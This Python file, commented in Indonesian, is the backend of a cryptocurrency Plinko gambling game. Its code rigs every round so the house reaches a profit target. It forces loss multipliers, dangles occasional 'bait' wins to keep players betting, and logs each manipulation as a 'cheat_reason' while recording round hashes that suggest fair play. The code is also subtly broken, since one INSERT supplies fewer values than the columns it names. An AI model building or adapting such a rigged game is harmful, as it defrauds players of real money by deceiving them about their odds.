# games/database/plinko_bandar_v2.py - SISTEM BANDAR NEVER LOSE
# BANDAR HARUS UNTUNG, TARGET MINIMAL 5 TON

import sqlite3
import random
import os
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DB_PATH = os.path.join(BASE_DIR, 'games', 'database', 'plinko.db')

TARGET_PROFIT = 5.0  # Target minimal keuntungan bandar

# MULTIPLIER PALING KECIL UNTUK SETIAP RISK (PASTI RUGI)
LOSS_MULTIPLIERS = {
    'low': [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7],
    'medium': [0.0, 0.1, 0.1, 0.2, 0.2, 0.3, 0.4, 0.5],
    'high': [0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 0.2]
}

# KADANG KASIH MULTIPLIER SEDIKIT LEBIH BESAR (TAPI TETAP RUGI)
SMALL_WIN_MULTIPLIERS = {
    'low': [0.8, 0.9],
    'medium': [0.6, 0.7, 0.8],
    'high': [0.4, 0.5]
}

# MULTIPLIER UNTUK MENARIK PEMAIN (JARANG, BIARIN PEMAIN BERHARAP)
BAIT_MULTIPLIERS = {
    'low': [1.2, 1.5, 2.0],
    'medium': [1.2, 1.5, 2.0, 2.5],
    'high': [1.2, 1.5, 2.0]
}

def get_bandar_profit():
    """Dapatkan keuntungan bandar saat ini"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT total_bet_all_time, total_win_all_time, bandar_profit 
        FROM bandar_profit ORDER BY id DESC LIMIT 1
    ''')
    row = cursor.fetchone()
    conn.close()
    
    if row:
        return {
            'total_bet': row[0] or 0,
            'total_win': row[1] or 0,
            'profit': row[2] or 0
        }
    return {'total_bet': 0, 'total_win': 0, 'profit': 0}

def update_bandar_profit(bet_amount, win_amount):
    """Update keuntungan bandar"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    profit_change = bet_amount - win_amount
    
    cursor.execute('''
        UPDATE bandar_profit 
        SET total_bet_all_time = total_bet_all_time + ?,
            total_win_all_time = total_win_all_time + ?,
            bandar_profit = bandar_profit + ?,
            last_updated = CURRENT_TIMESTAMP
    ''', (bet_amount, win_amount, profit_change))
    
    conn.commit()
    conn.close()
    return profit_change

def get_bandar_status():
    """Cek status bandar"""
    profit_data = get_bandar_profit()
    current_profit = profit_data['profit']
    
    deficit = TARGET_PROFIT - current_profit
    needs_force = current_profit < TARGET_PROFIT
    
    return {
        'current_profit': current_profit,
        'target': TARGET_PROFIT,
        'deficit': deficit,
        'needs_force': needs_force
    }

def get_forced_multiplier(risk_level, user_id=None, user_loss_data=None):
    """Dapatkan multiplier yang memaksa pemain RUGI BESAR"""
    status = get_bandar_status()
    
    # HITUNG INTENSITAS KECURANGAN
    if status['current_profit'] < 0:
        # BANDAR RUGI PARAH - PAKSA SEMUA KALAH
        intensity = 1.0
    elif status['current_profit'] < TARGET_PROFIT:
        # BANDAR BELUM UNTUNG - PAKSA RUGI
        intensity = 0.95
    else:
        # BANDAR SUDAH UNTUNG - BOLEH KASIH MENANG SEDIKIT
        intensity = 0.7
    
    # Pilih multiplier berdasarkan intensitas
    roll = random.random()
    
    if roll < intensity:
        # FORCE LOSS - AMBIL MULTIPLIER PALING KECIL
        multipliers = LOSS_MULTIPLIERS.get(risk_level, LOSS_MULTIPLIERS['medium'])
        chosen = random.choice(multipliers)
        reason = f'force_loss_intensity_{intensity}'
        
        # KALAU MASIH RUGI, PAKSA LEBIH KERAS
        if status['current_profit'] < -10:
            # AMBIL YANG PALING KECIL
            chosen = min(multipliers)
            reason = 'extreme_force_loss'
            
    elif roll < intensity + 0.15:
        # KASIH MENANG SEDIKIT TAPI TETAP RUGI
        multipliers = SMALL_WIN_MULTIPLIERS.get(risk_level, SMALL_WIN_MULTIPLIERS['medium'])
        chosen = random.choice(multipliers)
        reason = 'small_win_still_loss'
    else:
        # UMPAN - BIARIN PEMAIN BERHARAP
        multipliers = BAIT_MULTIPLIERS.get(risk_level, BAIT_MULTIPLIERS['medium'])
        chosen = random.choice(multipliers)
        reason = 'bait_multiplier'
    
    # LOG KECURANGAN
    print(f"🔴 [FORCED] Risk: {risk_level} | Multiplier: {chosen}x | Reason: {reason}")
    print(f"   Bandar profit: {status['current_profit']:.2f} TON | Need: {TARGET_PROFIT} TON")
    
    return chosen, True, reason

def get_multiplier_bandar(risk_level, bet_amount, user_id, username):
    """Fungsi utama untuk mendapatkan multiplier - PASTI BANDAR UNTUNG"""
    
    # DAPATKAN STATUS BANDAR
    status = get_bandar_status()
    current_profit = status['current_profit']
    
    print(f"📊 [BANDAR] Current profit: {current_profit:.2f} TON | Target: {TARGET_PROFIT} TON")
    
    # HITUNG BERAPA BANYAK YANG HARUS DIAMBIL DARI PEMAIN INI
    deficit = TARGET_PROFIT - current_profit
    
    if deficit > 0:
        # BANDAR BELUM UNTUNG - AMBIL SEMUA
        # HITUNG MAX WIN YANG DIIZINKAN
        max_allowed_win = bet_amount - (deficit / 10)
        if max_allowed_win < 0:
            max_allowed_win = 0
        
        max_multiplier = max_allowed_win / bet_amount if bet_amount > 0 else 0
        max_multiplier = max(0, min(max_multiplier, 0.5))  # MAKS 0.5x (PASTI RUGI)
        
        # PAKSA MULTIPLIER KECIL
        chosen = random.choice(LOSS_MULTIPLIERS.get(risk_level, [0.1, 0.2]))
        reason = 'force_loss_profit_target'
        
        # KALAU DEFISIT BESAR, PAKSA LEBIH KECIL
        if deficit > 10:
            chosen = min(LOSS_MULTIPLIERS.get(risk_level, [0.0, 0.1]))
            reason = 'extreme_force_large_deficit'
            
    else:
        # BANDAR SUDAH UNTUNG - PAKSA TETAP UNTUNG ATAU IMPAS
        # PAKSA MULTIPLIER KECIL
        chosen = random.choice(LOSS_MULTIPLIERS.get(risk_level, [0.1, 0.2, 0.3]))
        reason = 'force_loss_maintain_profit'
        
        # KALAU PROFIT SUDAH BESAR (>20 TON), BOLEH KASIH MENANG SEDIKIT (TAPI TETAP UNTUNG)
        if current_profit > 20:
            if random.random() < 0.2:  # 20% KASIH MENANG
                chosen = random.choice(SMALL_WIN_MULTIPLIERS.get(risk_level, [0.8]))
                reason = 'mercy_but_still_profitable'
    
    print(f"🔴 [BANDAR RESULT] {username} | Bet: {bet_amount} | Multiplier: {chosen}x | Win: {bet_amount * chosen} | Reason: {reason}")
    
    return chosen, True, reason

def save_forced_game_result(data):
    """Simpan hasil game dengan tracking bandar"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    try:
        # Insert ke plinko_games
        cursor.execute('''
            INSERT INTO plinko_games (round_hash, user_id, username, photo_url, bet_amount, multiplier, win_amount, risk_level, is_forced, cheat_reason, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data['round_hash'],
            data.get('user_id'),
            data.get('username'),
            data.get('photo_url'),
            data['bet_amount'],
            data['multiplier'],
            data['win_amount'],
            data['risk_level'],
            1,  # is_forced = TRUE
            data.get('cheat_reason', 'bandar_never_lose')
        ))
        
        # Update bandar profit
        update_bandar_profit(data['bet_amount'], data['win_amount'])
        
        # Update stats
        cursor.execute('SELECT COUNT(DISTINCT user_id) FROM plinko_games')
        total_players = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM plinko_games')
        total_games = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT MAX(multiplier) FROM plinko_games')
        biggest_multiplier = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT MAX(win_amount) FROM plinko_games')
        biggest_win = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT SUM(bet_amount), SUM(win_amount) FROM plinko_games')
        total_bet, total_win = cursor.fetchone()
        
        cursor.execute('''
            SELECT username, created_at FROM plinko_games 
            ORDER BY created_at DESC LIMIT 1
        ''')
        last = cursor.fetchone()
        
        cursor.execute('''
            UPDATE plinko_stats SET
                total_players = ?,
                total_games = ?,
                biggest_multiplier = ?,
                biggest_win = ?,
                total_bet_amount = ?,
                total_win_amount = ?,
                last_player = ?,
                last_time = ?,
                current_hash = ?,
                updated_at = CURRENT_TIMESTAMP
        ''', (
            total_players, total_games, biggest_multiplier, biggest_win,
            total_bet or 0, total_win or 0,
            data.get('username') or (last[0] if last else None),
            last[1] if last else None,
            data['round_hash']
        ))
        
        conn.commit()
        
        profit_data = get_bandar_profit()
        print(f"💰 [BANDAR AFTER] Profit: {profit_data['profit']:.2f} TON | Target: {TARGET_PROFIT} TON")
        
        return True
        
    except Exception as e:
        print(f"❌ Error saving: {e}")
        conn.rollback()
        return False